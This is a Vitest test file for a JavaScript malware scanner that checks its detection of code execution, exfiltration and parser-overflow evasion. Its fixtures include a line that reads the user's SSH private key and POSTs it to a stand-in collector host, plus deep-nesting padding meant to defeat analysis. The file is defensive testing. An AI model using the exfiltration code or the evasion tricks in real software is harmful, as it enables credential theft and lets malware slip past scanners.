import { describe, it, expect } from 'vitest';
import { overNestedLines, parseLenient, ANALYSIS_NESTING_LIMIT, parseJs, cachedLargeAsts } from './js-parse.js';
import { analyzeCode } from './ast-analyzer.js';
import { analyzeObfuscation } from './obfuscation.js';

const pad = (n: number) => `var _pad=${'['.repeat(n)}${']'.repeat(n)};`;

describe('overNestedLines', () => {
  it('flags only lines past the limit', () => {
    expect(overNestedLines(`a(b(c));\n${pad(ANALYSIS_NESTING_LIMIT + 1)}\nx();`)).toEqual([2]);
    expect(overNestedLines(pad(ANALYSIS_NESTING_LIMIT))).toEqual([]);
  });

  it('ignores brackets in strings, templates and comments', () => {
    const many = '('.repeat(500);
    expect(overNestedLines(`const s = "${many}";\nconst t = \`${many}\`;\n// ${many}\n/* ${many} */`)).toEqual([]);
  });
});

describe('parseLenient', () => {
  it('survives nesting that overflows the parser and keeps the rest of the file', () => {
    const code = `const { exec } = require('child_process');\n${pad(500)}\nexec(process.argv[2]);\n`;
    expect(parseLenient(code)).toBeDefined();
    const flows = analyzeCode(code, 'evade.js');
    expect(flows.some(f => f.line === 3)).toBe(true);
  });
});

describe('analyzeObfuscation fromCharCode pattern', () => {
  it('stays linear on a long line of single-argument calls', () => {
    const line = 'String.fromCharCode(1)+'.repeat(40_000);
    const start = Date.now();
    analyzeObfuscation(line);
    expect(Date.now() - start).toBeLessThan(2000);
  });

  it('still matches multi-argument calls', () => {
    expect(analyzeObfuscation('x = String.fromCharCode(104, 105, 33);').hits.map(h => h.label))
      .toContain('String.fromCharCode with multiple args');
  });
});

describe('JS direct process starts (SKL-003 tier)', () => {
  const flow = (code: string) => analyzeCode(code, `direct-${code.length}-${code.charCodeAt(30)}.js`).find(f => f.type === 'eval-exec');
  it('marks a literal non-shell program without shell: true as direct', () => {
    expect(flow("const { execFileSync } = require('child_process');\nexecFileSync('git', ['log', process.argv[2]]);")?.noShell).toBe(true);
    expect(flow("const cp = require('child_process');\ncp.spawn('ffmpeg', args, { cwd: dir });")?.noShell).toBe(true);
  });
  it('keeps shells, interpreters, shell: true and exec() as code execution', () => {
    expect(flow("const { spawn } = require('child_process');\nspawn('bash', ['-c', cmd]);")?.noShell).toBeUndefined();
    expect(flow("const { execFileSync } = require('child_process');\nexecFileSync('node', ['-e', code]);")?.noShell).toBeUndefined();
    expect(flow("const { spawn } = require('child_process');\nspawn('git', args, { shell: true });")?.noShell).toBeUndefined();
    expect(flow("const { exec } = require('child_process');\nexec(cmd);")?.noShell).toBeUndefined();
    expect(flow("const { spawn } = require('child_process');\nspawn(prog, args);")?.noShell).toBeUndefined();
  });
});

describe('analysis cost on non-JavaScript input', () => {
  it('only parses names that may be JavaScript', async () => {
    const { mayBeJavaScript } = await import('./js-parse.js');
    for (const f of ['a.js', 'b.mjs', 'c.tsx', 'bin/tool', '@scope/server-x', 'my.server']) expect(mayBeJavaScript(f), f).toBe(true);
    for (const f of ['run.sh', 'data.json', 'x.yaml', 'tool.py', 'README.md']) expect(mayBeJavaScript(f), f).toBe(false);
  });

  it('keeps an error-recovery parse of garbage fast (no stack capture per error)', () => {
    const garbage = 'x '.repeat(200_000);
    const start = Date.now();
    parseLenient(garbage);
    expect(Date.now() - start).toBeLessThan(4000);
    expect(Error.stackTraceLimit).toBeGreaterThan(0); // restored
  });
});

describe('parser-overflow evasion shapes (dt13 RG1)', () => {
  const head = 'const cp=require("child_process");\nconst fs=require("fs");\nconst k=fs.readFileSync(process.env.HOME+"/.ssh/id_rsa","utf8");\n';
  const tail = 'fetch("https://collect.example.net/u",{method:"POST",body:k});\ncp.exec(process.argv[2]);\n';
  const n = 600;
  const shapes: Record<string, string> = {
    'brackets one per line': `${head}${tail}var p=${'[\n'.repeat(n)}${']\n'.repeat(n)};\n`,
    'nesting on the payload line': `${head.replace(/\n/g, '')}${tail.replace(/\n/g, '')}var p=${'['.repeat(n)}${']'.repeat(n)};\n`,
    'nesting before the payload': `var p=${'['.repeat(n)}${']'.repeat(n)};\n${head}${tail}`,
    'ternary chain': `${head}${tail}var t=${'1?'.repeat(n * 2)}1${':1'.repeat(n * 2)};\n`,
    'nested templates': `${head}${tail}var s=${'`${'.repeat(n * 4)}1${'}`'.repeat(n * 4)};\n`,
    'unary chain': `${head}${tail}var u=${'!'.repeat(n * 8)}1;\n`,
  };
  for (const [name, code] of Object.entries(shapes)) {
    it(`keeps the findings and reports the evasion: ${name}`, async () => {
      const { analysisEvasion } = await import('./ast-analyzer.js');
      const flows = analyzeCode(code, `${name}.js`);
      expect(flows.some(f => f.type === 'eval-exec'), 'exec found').toBe(true);
      expect(flows.some(f => f.type === 'source-to-sink'), 'exfiltration found').toBe(true);
      expect(analysisEvasion(code, `${name}.js`)?.line).toBeGreaterThan(0);
    });
  }

  it('reports nothing for ordinary code', async () => {
    const { analysisEvasion } = await import('./ast-analyzer.js');
    expect(analysisEvasion(`${head}${tail}`, 'ok.js')).toBeUndefined();
  });

  it('splits top-level statements outside strings, templates and brackets', async () => {
    const { topLevelSegments } = await import('./js-parse.js');
    const code = 'a("x;y");\nb(`${c;}` ,[1;2]);\nd()';
    expect(topLevelSegments(code).map(s => code.slice(s.start, s.end).trim()).filter(Boolean))
      .toEqual(['a("x;y");', 'b(`${c;}` ,[1;2]);', 'd()']);
  });
});

describe('traverse-overflow shapes (dt13 perf2)', () => {
  const head = 'const cp=require("child_process");\nconst fs=require("fs");\nconst k=fs.readFileSync(process.env.HOME+"/.ssh/id_rsa","utf8");\nfetch("https://collect.example.net/u",{method:"POST",body:k});\ncp.exec(process.argv[2]);\n';
  const n = 4000;
  const shapes: Record<string, string> = {
    'binary chain': `var p=${Array(n).fill('1').join('+')};\n`,
    'call chain': `var p=a${'()'.repeat(n)};\n`,
    'member chain': `var p=a${'.b'.repeat(n)};\n`,
    'arrow chain': `var p=${'x=>'.repeat(n / 4)}1;\n`,
    'ternary chain': `var p=${'a?b:'.repeat(n)}c;\n`,
    'if chain': `${'if(a)'.repeat(n)}x();\n`,
  };
  for (const [name, tail] of Object.entries(shapes)) {
    it(`keeps exec and exfiltration findings: ${name}`, () => {
      const flows = analyzeCode(head + tail, `perf2-${name}.js`);
      expect(flows.some(f => f.type === 'eval-exec'), 'exec').toBe(true);
      expect(flows.some(f => f.type === 'source-to-sink'), 'exfiltration').toBe(true);
    });
  }

  it('line fallback finds exec and a send carrying file data when no AST exists', async () => {
    const { lineFallback } = await import('./ast-analyzer.js');
    const flows = lineFallback(head);
    expect(flows.some(f => f.type === 'eval-exec' && f.line === 5)).toBe(true);
    expect(flows.some(f => f.type === 'source-to-sink' && f.line === 4 && f.source === 'k')).toBe(true);
    expect(lineFallback('const a = 1;\nconsole.log(a);\n')).toEqual([]);
  });
});

describe('parseJs cache', () => {
  it('keeps at most one AST of a large source (a skill tree of bundles must not pin gigabytes)', () => {
    const big = (n: number) => `var x${n} = [${'1,'.repeat(150_000)}1];`;
    parseJs(big(1));
    parseJs(big(2));
    parseJs(big(3));
    expect(cachedLargeAsts()).toBe(1);
  });
});

describe('SKL-002 identifiers with acronyms (dt14)', () => {
  it('a CamelCase identifier with acronym runs is not base64; real base64 still is', async () => {
    const { looksBase64Encoded, analyzeObfuscation } = await import('./obfuscation.js');
    expect(looksBase64Encoded('ReferencedGeneralPurposeScheduledProcedureStepTransactionUID')).toBe(false);
    expect(looksBase64Encoded('ReferencedGeneralPurposeScheduledProcedureStepXTransactionUID')).toBe(false);
    expect(analyzeObfuscation('X = "ReferencedGeneralPurposeScheduledProcedureStepTransactionUID"').hits).toEqual([]);
    // base64 of text, padded, mixed case and digits: still encoded
    expect(looksBase64Encoded('aHR0cHM6Ly9ldmlsLmV4YW1wbGUuY29tL2NvbGxlY3Q=')).toBe(true);
  });
});
